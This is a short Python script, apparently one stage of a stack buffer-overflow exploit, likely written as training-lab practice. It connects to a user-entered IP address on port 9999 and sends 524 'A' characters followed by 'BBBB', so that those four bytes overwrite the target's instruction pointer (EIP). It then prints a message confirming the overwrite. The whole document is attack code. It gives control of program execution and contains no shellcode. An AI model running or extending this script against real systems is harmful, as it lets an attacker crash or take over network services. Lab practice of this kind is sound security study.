import socket

HOST=input("[!]Enter IP :: ")

offset=524

string="A"*offset+"BBBB"

with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
	c.connect((HOST,9999))
	c.recv(99999)
	c.send(bytes(string+' \r\n',"utf-8"))
	print("4 bytes overwritten on eip")
	c.close()
